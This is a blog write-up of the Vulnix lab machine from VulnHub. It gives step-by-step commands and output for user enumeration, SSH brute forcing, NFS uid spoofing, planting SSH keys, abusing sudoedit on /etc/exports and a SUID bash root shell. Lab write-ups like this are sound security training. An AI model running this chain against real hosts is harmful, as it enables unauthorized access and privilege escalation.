---
layout: post
title: "HackLAB Vulnix"
date: 2017-06-20 08:04:29 -0400
comments: true
categories: [penetration testing, writeups]
keywords: vulnix, vulnix vulnhub, hacklab, hacklab vulnix, ctf, vulnhub, vulnix walkthrough, vulnix writeup, vulnix solution, smtp-user-enum, smtp user enum, nfs exploit, nfsshell
description: Vulnix writeup
---

Vulnix is an older machine from VulnHub that intends to present vulnerabilities from a misconfiguration point of view. The goal is to get the flag inside /root

<!-- more -->

Here are the Nmap results:

``` 
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
79/tcp    open  finger     Linux fingerd
110/tcp   open  pop3?
111/tcp   open  rpcbind    2-4 (RPC #100000)
143/tcp   open  imap       Dovecot imapd
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
995/tcp   open  ssl/pop3s?
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
36190/tcp open  status     1 (RPC #100024)
40731/tcp open  mountd     1-3 (RPC #100005)
43539/tcp open  nlockmgr   1-4 (RPC #100021)
46423/tcp open  mountd     1-3 (RPC #100005)
52024/tcp open  mountd     1-3 (RPC #100005)
```

### finger user enumeration

There are quite a few services listening on the host. One of the first things that grabbed my attention was finger running on port 79. Because of this, we can use finger to perform [user enumeration](https://pentestlab.blog/tag/finger/) on the host. We can use Nmap's script scan to see who is logged on the host, or do it manually. Here I will show the manual way:

``` 
finger @192.168.217.142
No one logged on.
```

The same thing can be achieved by running Nmap with the *-sC* flag. Next I tried to get more information about the root user:

``` 
finger root@192.168.217.142
Login: root           			Name: root
Directory: /root                    	Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

It seems the root user never logged in, but we still obtained the directory and shell that root uses. I tried a few more guesses and discovered a couple more users on the host:

``` 
finger user@192.168.217.142
Login: user           			Name: user
Directory: /home/user               	Shell: /bin/bash
Never logged in.
No mail.
No Plan.

Login: dovenull       			Name: Dovecot login user
Directory: /nonexistent             	Shell: /bin/false
Never logged in.
No mail.
No Plan.

finger vulnix@192.168.217.142
Login: vulnix         			Name: 
Directory: /home/vulnix             	Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

### SMTP user enumeration

Since port 25 is open, we can also attempt some enumeration with SMTP. Again, this can be accomplished with an Nmap script, but this time I want to use an utility called **smtp-user-enum**.

Homepage: http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum

> smtp-user-enum is a tool for enumerating OS-level user accounts on Solaris via the SMTP service (sendmail). 
> Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. It could be adapted to 
> work against other vulnerable SMTP daemons, but this hasn’t been done as of v1.0.

Let's see its options:

``` 
smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )

options are:
        -m n     Maximum number of processes (default: 5)
	-M mode  Method to use for username guessing EXPN, VRFY or RCPT (default: VRFY)
	-u user  Check if user exists on remote system
	-f addr  MAIL FROM email address.  Used only in "RCPT TO" mode (default: user@example.com)
        -D dom   Domain to append to supplied user list to make email addresses (Default: none)
                 Use this option when you want to guess valid email addresses instead of just usernames
                 e.g. "-D example.com" would guess foo@example.com, bar@example.com, etc.  Instead of 
                      simply the usernames foo and bar.
	-U file  File of usernames to check via smtp service
	-t host  Server host running smtp service
	-T file  File of hostnames running the smtp service
	-p port  TCP port on which smtp service runs (default: 25)
	-d       Debugging output
	-t n     Wait a maximum of n seconds for reply (default: 5)
	-v       Verbose
	-h       This help message

Also see smtp-user-enum-user-docs.pdf from the smtp-user-enum tar ball.

Examples:

$ smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1
$ smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1
$ smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt
$ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1
```

I created a file named users.txt with some usernames to try, and fed it to the script:

``` 
root@kali:~# smtp-user-enum -U users.txt -t 192.168.217.142
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... users.txt
Target count ............. 1
Username count ........... 6
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Tue Jun 20 09:29:30 2017 #########
192.168.217.142: root exists
192.168.217.142: vulnix exists
192.168.217.142: user exists
192.168.217.142: postmaster exists
192.168.217.142: mail exists
######## Scan completed at Tue Jun 20 09:29:30 2017 #########
5 results.

6 queries in 1 seconds (6.0 queries / sec)
```

You can see that this is a pretty cool script that can help you enumerate users pretty fast, and now we know more valid user accounts on the system. You can also use it to find valid email addresses instead of accounts, by using the *-D* option. I tried a few examples, but got no hits.

Moving on, ports 512-514 are fore the old r-utilities, and if misconfigured, could allow remote access to the host. But in this case, the system asked me for root's SSH password, so I couldn't exploit them.

### Exploit NFS

We've done some preliminary enumeration on the target, now it's time to return to the results of the Nmap scan. We've identified the fact that NFS is running on the Vulnix host. I confirmed it with the use of *rpcinfo*:

``` 
rpcinfo -p 192.168.217.142
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  39427  status
    100024    1   tcp  42309  status
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    2   tcp   2049
    100227    3   tcp   2049
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100227    2   udp   2049
    100227    3   udp   2049
    100021    1   udp  39258  nlockmgr
    100021    3   udp  39258  nlockmgr
    100021    4   udp  39258  nlockmgr
    100021    1   tcp  34418  nlockmgr
    100021    3   tcp  34418  nlockmgr
    100021    4   tcp  34418  nlockmgr
    100005    1   udp  34638  mountd
    100005    1   tcp  52581  mountd
    100005    2   udp  42603  mountd
    100005    2   tcp  53226  mountd
    100005    3   udp  49704  mountd
    100005    3   tcp  47770  mountd
```

If NFS wasn't properly configured, we might have access to shares we wouldn't otherwise be allowed to. There are a couple of ways to list the shares, and I'm going to show here some of them. Th easiest way is from the command line, with the <code>showmount -e</code> command:

``` 
root@kali:~# showmount -e 192.168.217.142
Export list for 192.168.217.142:
/home/vulnix *
```

Good news! The vulnix home directory is being shared with no restrictions. Before going there, let's see how we can get the same information with Nmap:

``` 
nmap -sV -p111 --script=nfs-showmount 192.168.217.142

Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-21 06:00 EDT
Nmap scan report for 192.168.217.142
Host is up (0.00027s latency).
PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| nfs-showmount: 
|_  /home/vulnix *
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      47770/tcp  mountd
|   100005  1,2,3      49704/udp  mountd
|   100021  1,3,4      34418/tcp  nlockmgr
|   100021  1,3,4      39258/udp  nlockmgr
|   100024  1          39427/udp  status
|   100024  1          42309/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
```

We can also use the *auxiliary/scanner/nfs/nfsmount* Metasploit module:

``` 
msf auxiliary(nfsmount) > run

[+] 192.168.217.142:111   - 192.168.217.142 NFS Export: /home/vulnix [*]
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

I mounted the share locally to see what's there. The *nolock* option disables file locking and it's sometimes required for older NFS servers.

``` 
root@kali:/mnt# mkdir nfs
root@kali:/mnt# mount -t nfs -o nolock 192.168.217.142:/home/vulnix /mnt/nfs
```

However, when I tried to access the newly mounted share, I got permission denied errors. I couldn't *chmod* or do anything else. After some reading on the interwebz, it seems the likely cause is the [root_squash](https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html) option, that nullifies the root privileges of the clients accessing the share, and instead gives them the user ID of the nobody user. It seems to be enabled by default on modern NFS implementations, and you can read more about it [here](http://www.techrepublic.com/article/working-with-nfs/).

After some more digging through the interwebz, I found an [interesting article about nfsshell](https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/), which is a userspace NFS client shell. I downloaded it from its [Github page](https://github.com/NetDirect/nfsshell), and to compile I had to install the following [dependencies](https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/): <code>apt-get install libreadline-dev libncurses5-dev</code>. Afterwards, I ran *make* and it compiled fine. Here are its options:

``` 
nfs> help
host <host> - set remote host name
uid [<uid> [<secret-key>]] - set remote user id
gid [<gid>] - set remote group id
cd [<path>] - change remote working directory
lcd [<path>] - change local working directory
cat <filespec> - display remote file
ls [-l] <filespec> - list remote directory
get <filespec> - get remote files
df - file system information
rm <file> - delete remote file
ln <file1> <file2> - link file
mv <file1> <file2> - move file
mkdir <dir> - make remote directory
rmdir <dir> - remove remote directory
chmod <mode> <file> - change mode
chown <uid>[.<gid>] <file> -  change owner
put <local-file> [<remote-file>] - put file
mount [-upTU] [-P port] <path> - mount file system
umount - umount remote file system
umountall - umount all remote file systems
export - show all exported file systems
dump - show all remote mounted file systems
status - general status report
help - this help message
quit - its all in the name
bye - good bye
handle [<handle>] - get/set directory file handle
mknod <name> [b/c major minor] [p] - make device
```

From my reading about NFS and root squashing, it seems that knowing the uid of the share's owner would allow mounting the share as that user and bypassing the access denied errors that I got as root. Because the share is the home folder of the vulnix user, we need to know the uid for that particular user account. But we need local access to the machine to find that out. Well, we did get some usernames from the enumeration stage, so we probably have to attempt a bruteforce attack. From all the discovered usernames, I only kept the user and vulnix ones, because the rest were users for various services on the system. And then I ran Hydra with the recommended task number for SSH:

{% img center /images/pentest/vulnix-hydra.png 'hydra' 'letmein' %}

Hydra found the password for user pretty quickly. I logged in as user, but didn't find anything out of the ordinary. However, I was able to get the uid for the vulnix account:

``` 
user@vulnix:~$ id vulnix
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
```

I went back to nfsshell and made the changes:

``` 
nfs> host 192.168.217.142
Using a privileged port (1023)
Open 192.168.217.142 (192.168.217.142) TCP
nfs> uid 2008
nfs> gid 2008
nfs> status
User id      : 2008
Group id     : 2008
Remote host  : `192.168.217.142'
Transfer size: 0
```

Now I was able to access the share:

``` 
nfs> ls -l
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .
drwxr-x---  2     2008  2008      4096  Sep  2  2012  ..
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bash_logout
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bashrc
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .profile
```

Since this is vulnix's home directory, we can put an SSH key in here to allow remote access. I tried the next steps through nfsshell, but I was limited in the commands I could run. So I created a local vulnix user on my machine, and assigned it the uid 2008: <code>root@kali:~# useradd vulnix -u 2008</code>. Then I generated an SSH key pair from this account:

``` 
root@kali:~# su vulnix
$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
$ cd /tmp
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): vulnix
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in vulnix.
Your public key has been saved in vulnix.pub.
The key fingerprint is:
SHA256:P6FAPt9R/0TbOTtQUhk8SiBUlgAtINciO0mUmr2Nrp4 vulnix@kali
The key's randomart image is:
+---[RSA 2048]----+
|  .o.oo.++o+o .oo|
|   +o. o .o. ..+ |
|  = + o .   o...o|
| o = o     . oo.+|
|    = + S o  ..+o|
|   o . + + o  .oo|
|  .     o +    o.|
|  ..       .    .|
|.E.              |
+----[SHA256]-----+
```

I now navigated without problems to the NFS share, created a .ssh directory and copied the contents of the public key to *authorized_keys*:

``` 
$ cat /tmp/vulnix.pub > .ssh/authorized_keys
$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuO5LOA1EIJeaFJHHic7NRNIUvOhBApq7CSu7PAM/THU4hngoZ4kglgFC9QdbsfQsRWLHsDmNcAAGLzIKwkLYXWYanBK/7xdmRmtGf0Sr32zZ4NaXP9B228fjUu5LSi42X/9HcfL9QdfXuB336OvXo43sDzLifrzoiBzlviZV55+uVd+/hI0GCRE3Yi9JrLs1A6NhuHq8xtRLJURhuGwoouA2tGZ+6fSr7t23bC1emBnyUiy2hu/4oS9tLvvptPv1Md9E+Ire6XMjZzCJufcSqiMVrVefnWv5j460TjHhKP7aq23nbzlxMqkZ8r9ovm5KW0UWWWyVPkOFSxPgFEaRr vulnix@kali
```

And I was able to login with the key: <code>ssh -i /tmp/vulnix vulnix@192.168.217.142</code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:

``` 
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

This is wonderful news. First of all, we need to disable *root_squash*. Then we can mount the root directory and read the flag, or we can leave a shell binary in vulnix's home directory, and run it later with root privileges. Let's do just that! I disabled root squashing with <code>/home/vulnix    *(rw,no_root_squash)</code>. Then I copied the bash executable:

``` 
vulnix@vulnix:~$ cp /bin/bash /home/vulnix/
vulnix@vulnix:~$ ls -l
total 900
-rwxr-xr-x 1 vulnix vulnix 920788 Jun 21 14:46 bash
```

For the NFS configuration changes to take effect, I needed to make the NFS service to reload its configuration file or restart it, but I didn't have permissions to do that. So I rebooted the machine (but unmounted the share first). After rebooting, I mounted the share again, navigated to it as root with no problems, and changed permissions on the bash shell to make it SUID: <code>chmod 4777 bash</code> (I also copied it again as root).

From the SSH, I verified it as the vulnix user:

``` 
vulnix@vulnix:~$ ls -l bash
-rwsrwxrwx 1 root root 920788 Jun 21 15:34 bash
```

Finally, I ran the shell while preserving its permissions:

``` 
vulnix@vulnix:~$ ./bash -p
bash-4.2# whoami
root
bash-4.2# cat /root/trophy.txt
cc614640424f5bd60ce5d5264899c3be
```

Not done yet, I cracked the MD5 hash to reveal the name of the l33t name of the author: Reb00tu53r. This was a fun one!


**Learn more**

- [NFSShell on Kali Linux](https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/)

- [Using nfsshell to compromise older environments](https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/)

- [Working with NFS](http://www.techrepublic.com/article/working-with-nfs/)

``` 
 _____________________________________
/ Q: What do you call a half-dozen    \
| Indians with Asian flu? A: Six sick |
\ Sikhs (sic).                        /
 -------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
